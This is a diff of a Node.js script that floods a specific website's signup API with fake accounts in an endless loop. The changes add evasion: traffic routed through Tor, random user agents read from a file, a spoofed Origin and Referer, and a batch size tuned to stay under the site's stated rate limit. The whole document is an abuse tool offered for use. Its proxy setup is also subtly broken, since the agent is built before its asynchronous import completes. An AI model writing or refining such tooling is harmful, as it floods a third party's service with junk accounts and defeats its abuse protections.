@@ -1,16 +1,41 @@
 const axios = require('axios');
-const { SocksProxyAgent } = require('socks-proxy-agent');
+const fs = require('fs');
 
+// ====================== CONFIG ======================
 const URL = 'https://api.aryankaushik.space/api/auth/signup';
 const TOR_PROXY = 'socks5://127.0.0.1:9050';
-const REQUESTS_PER_IP = 20;
-const TIMEOUT_MS = 12000;
+const REQUESTS_PER_IP = 6;        // Safe under the 8/hour rate limit
+const TIMEOUT_MS = 15000;
 
-const agent = new SocksProxyAgent(TOR_PROXY);
+// Load User-Agents from file
+let userAgents = [];
+try {
+    userAgents = fs.readFileSync('user-agents.txt', 'utf8')
+                   .split('\n')
+                   .map(ua => ua.trim())
+                   .filter(ua => ua.length > 20);
+    console.log(`✅ Loaded ${userAgents.length} User-Agents from user-agents.txt`);
+} catch (e) {
+    console.error("user-agents.txt not found, using default UA");
+    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
+}
 
-function randomString(len = 10) {
+function randomString(len = 12) {
     return Math.random().toString(36).substring(2, len + 2);
 }
+
+function getRandomUserAgent() {
+    return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+// Dynamic import for socks-proxy-agent (works in CommonJS)
+let SocksProxyAgent;
+(async () => {
+    const mod = await import('socks-proxy-agent');
+    SocksProxyAgent = mod.SocksProxyAgent;
+})();
+
+const agent = new (SocksProxyAgent || class {})(TOR_PROXY);
 
 async function getCurrentIP() {
     try {
@@ -19,18 +44,18 @@ async function getCurrentIP() {
             timeout: TIMEOUT_MS
         });
         console.log(`\n🌍 NEW IP → ${res.data.ip} | ${res.data.city}, ${res.data.country}`);
-        return res.data.ip;
     } catch (e) {
-        console.log(`\n⚠️  IP Check Failed: ${e.message}`);
-        return null;
+        console.log(`\n⚠️ IP Check Failed`);
     }
 }
 
 async function sendSignup(count) {
-    const rand = randomString(8);
-    const username = `yoto_${rand}`;
-    const email = `${username}@gmail.com`;
-    const password = `Pass${rand}123!`;
+    const rand1 = randomString(8);
+    const rand2 = randomString(6);
+
+    const username = `user_${rand1}`;
+    const email = `u${rand1}+${rand2}@outlook.com`;   // Outlook alias
+    const password = `Pass${rand1}123!`;
 
     const payload = { username, email, password };
 
@@ -40,8 +65,9 @@ async function sendSignup(count) {
             timeout: TIMEOUT_MS,
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Origin': 'https://aeroweb.aryankaushik.space'
+                'User-Agent': getRandomUserAgent(),
+                'Origin': 'https://aeroweb.aryankaushik.space',
+                'Referer': 'https://aeroweb.aryankaushik.space/'
             }
         });
         console.log(`[${count}] ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
@@ -53,15 +79,21 @@ async function sendSignup(count) {
 }
 
 async function main() {
-    console.log("=== Tor + tornet Signup Flood Started ===\n");
+    console.log("=== Tor Signup Flood (Outlook Alias + Random UA) Started ===\n");
+    let batch = 1;
+
     while (true) {
+        console.log(`\n🔄 === Batch ${batch} ===`);
         await getCurrentIP();
+
         for (let i = 1; i <= REQUESTS_PER_IP; i++) {
             await sendSignup(i);
         }
-        console.log(`✅ Batch of ${REQUESTS_PER_IP} requests completed\n`);
-        await new Promise(r => setTimeout(r, 800)); // small wait for rotation
+
+        console.log(`✅ Batch ${batch} finished (${REQUESTS_PER_IP} requests)\n`);
+        batch++;
+        await new Promise(r => setTimeout(r, 1200));
     }
 }
 
-main();
+main().catch(console.error);
